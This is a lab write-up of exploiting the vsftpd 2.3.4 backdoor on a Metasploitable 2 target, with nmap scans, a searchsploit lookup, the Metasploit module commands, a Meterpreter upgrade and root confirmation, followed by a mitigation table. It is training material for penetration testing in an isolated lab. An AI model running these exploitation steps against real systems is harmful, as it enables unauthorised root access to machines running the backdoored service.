# Exercise 01 – vsftpd 2.3.4 backdoor

[← Back to README](../../../README.md)

| Item | Value |
| ---- | ----- |
| Attacker | Kali Linux – `192.168.50.10` |
| Target | Metasploitable 2 – `192.168.50.20` |
| Service | FTP – vsftpd 2.3.4 |
| Vulnerability | CVE-2011-2523 – backdoor command execution |
| Outcome | Root-level command execution |

```text
Reconnaissance → Enumeration → Vulnerability research → Exploitation → Post-exploitation → Documentation
```

## 1. Reconnaissance

```bash
nmap 192.168.50.20
```

Notable open TCP ports:

| Port | Service |
| ---- | ------- |
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 80 | HTTP |
| 139 | NetBIOS |
| 445 | SMB |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 8180 | HTTP (Tomcat) |

## 2. Enumeration

```bash
nmap -sV 192.168.50.20
nmap -p21 --script ftp-anon,ftp-syst 192.168.50.20
```

Findings:

- FTP service: **vsftpd 2.3.4**
- **Anonymous FTP login allowed**

## 3. Vulnerability research

```bash
searchsploit vsftpd 2.3.4
```

Result: *vsftpd 2.3.4 – Backdoor Command Execution*. This release was distributed with a malicious backdoor: a username ending in `:)` opens a root shell listening on TCP 6200.

## 4. Exploitation

```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.50.20
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.50.10
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

The module returns a command shell session. It was upgraded to Meterpreter for post-exploitation:

```text
msf6 > sessions -u 1
```

## 5. Post-exploitation enumeration

| Command | Result |
| ------- | ------ |
| `getuid` | `Server username: root` |
| `sysinfo` | Ubuntu 8.04, Linux 2.6.24-16-server, i686 |
| `pwd` | `/root` |
| `getpid` | `5034` |

Root-level command execution on the target was confirmed.

## Defensive takeaways

| Issue | Mitigation |
| ----- | ---------- |
| Backdoored, outdated software | Verify package signatures and checksums, patch, keep an asset/version inventory |
| Anonymous FTP enabled | Disable anonymous access, or replace FTP with SFTP |
| Many unnecessary services exposed | Reduce attack surface; host firewall |
| Flat access to the target | Network ACLs; only allow what the exercise needs ([hardening.md](../../hardening.md)) |
| No detection | Network IDS / logging would flag the connection to TCP 6200 (planned) |

## Concepts practiced

Service discovery · port scanning · version enumeration · anonymous FTP · vulnerability research · exploit validation · Metasploit · Meterpreter · privilege verification · post-exploitation enumeration · network segmentation
